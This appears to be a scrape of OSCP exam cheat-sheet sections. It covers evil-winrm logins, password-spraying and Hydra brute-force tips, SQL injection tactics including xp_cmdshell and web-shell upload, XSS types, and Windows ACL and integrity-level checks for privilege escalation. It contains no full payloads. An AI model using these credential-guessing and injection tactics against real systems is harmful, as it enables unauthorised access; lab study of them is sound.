evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'

Practical Example

evil-winrm -i 10.10.50.100 -u adminuser -p 'SuperSecure2024!'

Shell Special Character Handling

Always use single quotes around passwords containing special characters (!, @, #, $, &) to prevent shell interpretation errors on Linux.

docs.title: Pro Tips
docs.text:
OSCP Exam Tips

  • Always try seasonal passwords first (Summer2023, Winter2024, etc.)
  • Company name + 123 or year is very common
  • Look for hints on website - copyright year, company name
  • Username often equals password - try it!
  • Don't forget blank passwords - sometimes overlooked
  • Try variations - Password123, Password1!, P@ssw0rd123
  • Document what you try - don't repeat attempts

Pattern Recognition

  • If you find one password works, try variations
  • If "Summer2023" works for one user, try for all users
  • If company is "Acme", try Acme123, Acme2023, Acme!
  • Look at copyright dates on websites for year hints
  • Department names often used (IT2023, HR2023)

Efficiency Tips

  • Start with small, targeted lists (10-50 passwords)
  • Use password spraying (one password, many users)
  • Avoid account lockouts - be careful with attempts
  • Time-box your attempts - don't spend hours on passwords
  • Keep a running list of passwords that work

Common Mistakes

  • Trying too many passwords (causing lockout)
  • Not trying seasonal passwords (biggest OSCP hint)
  • Forgetting to try username as password
  • Not looking for password hints on website
  • Using huge wordlists first (waste of time)
  • Not documenting what passwords work where

OSCP Restrictions

  • Don't cause account lockouts - be careful with attempts
  • Document your methodology in report
  • Note which passwords worked where
  • Show manual attempts before automated
  • Time management - don't spend too long on passwords

docs.title: Pro Tips
docs.text:
Exam Tips

  • Always start with common/default credentials
  • Use small wordlists first (top-100, top-1000)
  • Capture login request with Burp to get exact parameters
  • Test your Hydra command with known credentials first
  • Use -f flag to stop after first success
  • Document successful credentials immediately
  • Be patient - some services are rate-limited

Web Attack Tips

  • Inspect failed login to find unique error text
  • Check for CSRF tokens (may prevent brute force)
  • Look for cookies required for authentication
  • Test with cURL first to understand the response
  • Use Burp Suite to capture exact POST data
  • Check HTTP response codes (200, 302, 403, etc.)

Common Mistakes

  • Not URL-encoding special characters in parameters
  • Using wrong protocol (http vs https)
  • Incorrect failure/success string
  • Missing required headers or cookies
  • Too many parallel tasks causing lockouts
  • Not testing with known valid credentials first

Restrictions

  • Don't DoS the target - use reasonable thread counts
  • Document your methodology for the report
  • Note successful credentials with timestamps
  • Be mindful of account lockouts on Active Directory

docs.title: Exam Tips
docs.text:
1. Always test for SQLi on any input fields (GET/POST parameters, cookies, headers)
  2. Check for different database types - MySQL and MSSQL have different syntax
  3. Try both error-based and blind techniques if error messages are suppressed
  4. Use time-based blind injection when boolean-based doesn't work
  5. Look for command execution via xp_cmdshell (MSSQL) or LOAD_FILE/INTO OUTFILE (MySQL)
  6. Extract credentials from database and try password reuse
  7. Document all findings including database version, table names, and extracted data
  8. Try file read/write to access configuration files or upload web shells
  9. Be patient with blind injection - it takes time but works reliably
  10. Use sqlmap wisely - understand what it's doing, manual testing is often faster for

docs.title: Overview
docs.text: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. This cheatsheet covers practical XSS techniques for exam scenarios.

docs.title: Quick Detection Checklist
docs.text:
• [ ] Test all input fields (search, comments, forms)
  • [ ] Check URL parameters and fragments
  • [ ] Test HTTP headers (User-Agent, Referer, Cookie)
  • [ ] Look for reflected input in HTML, JavaScript, attributes
  • [ ] Check for stored XSS in profiles, comments, messages
  • [ ] Test file upload features (filename, content)
  • [ ] Examine DOM-based sinks (innerHTML, eval, document.write)

docs.title: 1. Reflected XSS
docs.text:
Payload is reflected immediately in the response 

Victim clicks malicious link → Server reflects payload → Executes in browser

docs.title: 2. Stored XSS
docs.text:
Payload is stored on server and served to multiple users 

Attacker stores payload → Server saves to database → Other users view page → Executes

docs.title: 3. DOM-Based XSS
docs.text:
Payload executes through DOM manipulation 

Payload in URL fragment → JavaScript processes it → Executes without server interaction

docs.text:
CMDPowerShell 
:: Check permissions for a specific file
icacls "C:\path\to\your\file.txt"

:: Check permissions for a specific folder
icacls "C:\path\to\your\folder"

:: Save permissions to a file for backup/review
icacls "C:\path\to\your\folder" /save C:\temp\permissions.txt

:: To restore permissions from the file
icacls "C:\path\to\your" /restore C:\temp\permissions.txt

:: To grant permission to a file /t - set recursevely | /c - continue when error
icacls "C:\path\to\your" /grant hostname\username:R /t /c

# Get permissions (ACL) for a specific file
Get-Acl C:\path\to\your\file.txt

# Display the Access Control List (ACL) in a more readable list format
Get-Acl C:\path\to\your\file.txt | Format-List

# View just the access rules for a file or folder
(Get-Acl C:\path\to\your\folder).Access

# List permissions for all items in a directory and format as a table
Get-ChildItem C:\path\to\your\folder | ForEach-Object { Get-Acl $_.FullName } | Select-Object Path, Owner, Group

Understanding Windows Permissions

Permissions in Windows are managed through Access Control Lists (ACLs). Each file and folder has an ACL, which is a list of Access Control Entries (ACEs). Each ACE specifies which user or group has what kind of access.

Common Permission Codes:

icacls Code PowerShell Name Description (F) FullControl Full control. Users can modify, add, move, and delete files, as well as change permissions. (M) Modify Modify. Users can read, write, modify, and delete files and subfolders. (RX) ReadAndExecute Read and execute. Users can view file contents and run applications. (R) Read Read. Users can view file contents and properties. (W) Write Write. Users can write to a file or add files to a folder. (D) Delete Delete. Users can delete a file or folder.

Special Permission Flags:

  • CI (Container Inherit): Subfolders will inherit these permissions.
  • OI (Object Inherit): Files within the folder will inherit these permissions.

Mandatory Integrity Levels

Windows uses Mandatory Integrity Control (MIC) to restrict access based on integrity levels. These appear in icacls output and determine what processes can interact with files/folders.

Integrity Levels (Lowest to Highest):

Level Code Description Typical Use Untrusted (NW) Lowest integrity level Rarely used, severely restricted Low (LW) Low integrity Internet-facing applications, sandboxed browsers Medium (MW) Medium integrity (default) Standard user processes, most applications High (HW) High integrity Administrative processes, elevated applications System (SW) System integrity Core Windows services, kernel-mode processes

Why This Matters for Privilege Escalation:

  • A Medium integrity process cannot modify High integrity files, even if ACL permissions allow it
  • If you have a Medium integrity shell but are in the Administrators group, you're restricted by UAC
  • Check your current integrity level: whoami /groups | findstr "Mandatory"
  • Files/folders with Low or Medium mandatory levels are easier targets for modification

Example icacls Output: 

C:\temp\file.txt NT AUTHORITY\SYSTEM:(I)(F)
                 BUILTIN\Administrators:(I)(F)
                 BUILTIN\Users:(I)(RX)
                 Mandatory Label\Medium Mandatory Level:(NW)

The last line shows the integrity level - in this case, Medium Mandatory Level with No Write-up (NW), meaning lower-integrity processes cannot write to this file.
